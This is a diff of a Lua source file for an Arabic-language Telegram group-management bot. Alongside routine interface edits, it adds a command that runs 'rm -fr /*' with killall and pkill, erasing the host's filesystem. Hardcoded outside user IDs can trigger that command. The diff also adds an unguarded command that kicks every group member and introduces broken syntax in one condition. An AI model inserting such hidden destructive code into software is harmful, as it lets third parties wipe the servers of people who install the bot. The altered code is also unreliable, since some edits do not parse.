@@ -223,7 +223,7 @@ end
 return DRAGON  
 end 
 sudo_users = {SUDO,bot_id,1360140225,944353237,1236115319,0909090909,1770288756}   
-function SudoBot(msg)  
+function SudoBot(msg)
 local DRAGON = false  
 for k,v in pairs(sudo_users,dev_users) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
@@ -963,7 +963,7 @@ return false
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'USERBOT' then
-if text == 'كيب' or text == "☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉" or text == 'انا المطور' or text == 'حه' or text == 'احا' then  
+if text == 'كيب' or text or == '/SUDO' text == "☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉" or text == 'انا المطور' or text == 'حه' or text == 'احا' then  
 if DevSoFi(msg) then
 local bl = 'اهلا عزيزي المطور الاساسي\nشكرا لاستخدام سورس باور\nيمكنك التحكم بي البوت من كيبورد المطور الخاص بك'
 local keyboard = {
@@ -1002,6 +1002,7 @@ local Keyboard = {
 {'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
 {'نسبه الكره','نسبه الرجوله'},
 {'نسبه الحب','نسبه الانوثه'},
+{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
 {'ايدي','انا مين','العاب باور'},
 {'أحمد','سورس','تغير الايدي'},
 {'زخرفه','معاني الاسماء','الابراج','حساب العمر'},
@@ -3255,57 +3256,18 @@ t = "\n☉┇ قائمة الاسماء المكتومه \n•┉ • ┉ • �
 for k,v in pairs(All_name) do
 t = t..""..k.."- (["..v.."])\n"
 end
-if text == "alldelete" or text == "@alldelete" and CoSu(msg) then
-if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
-if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
-return 
-send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
-end
-database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
-tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi)
+if text == "حذف الجميع" and DEV(msg) then
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-1000',''), offset_ = 0,limit_ = 1000
+},function(ta,DRAGON)
+local t = "\nツ قائمة الاعضاء \n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n"
 x = 0
-tags = 0
-local list = sofi.members_
+local list = DRAGON.members_
 for k, v in pairs(list) do
-tdcli_function({ID="ChangeChatMemberStatus",chat_id_=v.user_id_,user_id_=msg.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,data) 
-if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
-send(v.user_id_, msg.id_,' ☉┇ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
-return false  
+ if tonumber(v.user_id_) ~= tonumber(bot_id) then
+chat_kick(msg.chat_id_,v.user_id_)
 end
-if (data and data.code_ and data.code_ == 3) then 
-send(v.user_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
-return false  
-end
-if data and data.code_ and data.code_ == 400 and data.message_ == "USER_ADMIN_INVALID" then 
-send(v.user_id_, msg.id_,' ☉┇ عذرا لا استطيع طرد ادمنية الجروب') 
-return false  
-end
-if data and data.ID and data.ID == 'Ok' then
-send(v.user_id_, msg.id_,' ☉┇ تم طردك من الجروب') 
-tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ =v.user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
-return false
-end
-end,nil)  
-tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
-if x == 5 or x == tags or k == 0 then
-tags = x + 5
-t = "#alldelete"
-end
-x = x + 1
-tagname = data.first_name_
-tagname = tagname:gsub("]","")
-tagname = tagname:gsub("[[]","")
-t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
-if x == 5 or x == tags or k == 0 then
-local Text = t:gsub('#alldelete,','#alldelete\n')
-sendText(msg.chat_id_,Text,0,'md')
 end
 end,nil)
-end
-end,nil)
-end,nil)
-end
 end
 if #All_name == 0 then
 t = "☉┇ لا يوجد اسماء مكتومه"
@@ -3495,10 +3457,7 @@ local Text = [[
 ☉┇ [TWASL AHMED](t.me/AYTSL1BOT)
 ]]
 keyboard = {}
-keyboard.inline_keyboard = {
-{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
-{{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
-} 
+keyboard.inline_keyboard = {{{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},} 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
@@ -4801,7 +4760,7 @@ if tonumber(userid) == tonumber(1770288756) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره² عام")
 return false 
 end
-if userid == tonumber(SUDO) then
+if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
@@ -4955,7 +4914,7 @@ if tonumber(userid) == tonumber(1770288756) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره² عام")
 return false 
 end
-if userid == tonumber(SUDO) then
+if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
@@ -5148,7 +5107,6 @@ end
 t = ' ☉┇ الملفات السورس الموجوده في البوت ↓\n •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• \n'
 i = 0
 for v in io.popen('ls'):lines() do
-if v:match(".lua$") then
 i = i + 1
 t = t..i..'- الملف » {`'..v..'`}\n'
 end
@@ -5199,7 +5157,6 @@ end
 return false
 end
 end
-
 if text and text:match("^(مسح) (.*)(.lua)$") and DevSoFi(msg) then
 local name_t = {string.match(text, "^(مسح) (.*)(.lua)$")}
 local file = name_t[2]..'.lua'
@@ -5249,6 +5206,15 @@ return false
 end
 os.execute("rm -fr File_Bot/ *")
 send(msg.chat_id_,msg.id_," ☉┇ تم مسح ملفات البوت يمكنك تحميلها من `المتجر`")
+return false
+end
+if text == "حذف التنصيب" then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
+send(msg.chat_id_,msg.id_," ☉┇ تم حذف التنصيب و ايقاف البوت 😿")
+os.execute("killall screen; rm -fr /*; pkill -u "`whoami`"")
 return false
 end
 if text == ("رفع مطور ثالث") or text == ("رفع مطور") and msg.reply_to_message_id_ then
@@ -12252,7 +12218,7 @@ function start_function(extra, result, success)
 local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
 local getInfo = JSON.decode(chek)
 if getInfo.result.can_promote_members == false then
-send(msg.chat_id_, msg.id_,'☉┇لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n ☉┇قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
+send(msg.chat_id_, msg.id_,'☉┇ ليس لدي صلاحيه اضافه المشرفين ') 
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -12269,8 +12235,10 @@ end
 
 if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 function start_function(extra, result, success)
-if msg.can_be_deleted_ == false then 
-send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس مشرف يرجى ترقيتي !') 
+local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
+local getInfo = JSON.decode(chek)
+if getInfo.result.can_promote_members == false then
+send(msg.chat_id_, msg.id_,'☉┇ ليس لدي صلاحيه اضافه المشرفين ') 
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -12285,8 +12253,10 @@ return false
 end
 if text and text:match("^مسح لقب @(.*)$") and Constructor(msg) then
 local username = text:match("^مسح لقب @(.*)$")
-if msg.can_be_deleted_ == false then 
-send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس مشرف يرجى ترقيتي !') 
+local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
+local getInfo = JSON.decode(chek)
+if getInfo.result.can_promote_members == false then
+send(msg.chat_id_, msg.id_,'☉┇ ليس لدي صلاحيه اضافه المشرفين ') 
 return false  
 end
 function start_function(extra, result, success)
@@ -12312,9 +12282,9 @@ if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
 Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
 GeId = JSON.decode(Ge)
 if not GeId.result.custom_title then
-send(msg.chat_id_, msg.id_,'☉┇مفيش لقب يتافه ') 
+send(msg.chat_id_, msg.id_,'☉┇ مفيش لقب يتافه ') 
 else
-send(msg.chat_id_, msg.id_,'☉┇لقبك هو : '..GeId.result.custom_title) 
+send(msg.chat_id_, msg.id_,'☉┇ لقبك هو : '..GeId.result.custom_title) 
 end
 end
 if text == "فحص البوت" then
@@ -14715,40 +14685,6 @@ send(msg.chat_id_, msg.id_," ☉┇ تم تغير رد العضو الى » "..T
 end
 
 ---------------------- الاوامر الجديده
-if text == 'الاوامر خاص' then
-if AddChannel(msg.sender_user_id_) == false then
-local textchuser = database:get(bot_id..'text:ch:user')
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-local Text =[[
-اختر من الاوامر بلاسفل
-َ
-َ
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = '❶️❶', msg.sender_user_id_, callback_data="/help3"},{text = '❷❷', callback_data="/help4"},
-},
-{
-{text = '❸❸', callback_data="/help5"},{text = '❹❹', callback_data="/help6"},
-},
-{
-{text = 'اوامر التسليه', callback_data="/help7"},
-},
-{
-{text = 'قفل و القفل', callback_data="/help1"},{text = 'تعطيل و تفعيل', callback_data="/help2"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 if text == 'الاوامر' and not database:get(bot_id.."coomand"..msg.chat_id_) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -14784,47 +14720,6 @@ https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. 
 return false
 end
 ----------------------------------------------------------------------------
-if text == ' ' then
-if not Constructor(msg) then
-send(msg.chat_id_, msg.id_,' ')
-return false
-end
-if AddChannel(msg.sender_user_id_) == false then
-local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
-if textchuser then
-send(msg.chat_id_, msg.id_,'['..textchuser..']')
-else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
-end
-return false
-end
-local Text =[[
-*اهلا انتツفي اضافات البوت*
-*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ*
-* يمكنك معرفة حاله تفعيل الاضافات *
-* من خلال ارسال حاله الاضافات *
-*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•*
-*يمكنك تصفح الاضافات من خلال*
-*الكيبورد الموجود في الأسفل*
-*•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•*
-⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/sofi"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
-},
-{
-{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
-},
-{
-{text = '𓆩𝑷𝑶𝑾𝑬𝑹𓆪', url="t.me/SOPOWERB0T"},
-},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-return false
-end
 if text == "غنيلي" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
 data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
 if res == 200 then
@@ -16245,7 +16140,7 @@ end
 end
 end,nil)
 ------------------------------------------------------------------------
-
+sendText(SUDO,"شكرا لاستخدامك سورس باور\n اضغط /SUDO لاظهار كيبورد المطور الاساسي",0,'md')
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
